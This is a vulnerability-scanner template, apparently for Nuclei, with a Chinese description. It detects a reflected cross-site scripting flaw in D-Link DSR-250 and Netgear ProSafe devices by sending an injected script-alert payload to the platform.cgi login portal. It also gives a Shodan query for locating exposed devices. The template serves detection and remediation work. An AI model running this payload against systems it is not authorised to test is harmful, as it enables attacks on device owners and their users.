id: dlink-netgear-xss

info:
  name: Dlink DSR-250 and Netgear Prosafe - 跨站脚本漏洞
  author: gtrrnr,vulnspace
  severity: medium
  description: |
    该模板用于检测 Dlink DSR-250 and Netgear Prosafe - 跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://www.encripto.no/forskning/whitepapers/Netgear_prosafe_advisory_june_2015.pdf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"DSR-250"
  tags: xss,dlink,dsr250,netgear,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>'

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(response, "text/html")'
          - 'contains_any(body, "D-Link","Login.PortalName")'
          - 'contains(body, "value=\"SSLVPN\"><script>alert(document.domain)</script>")'
        condition: and
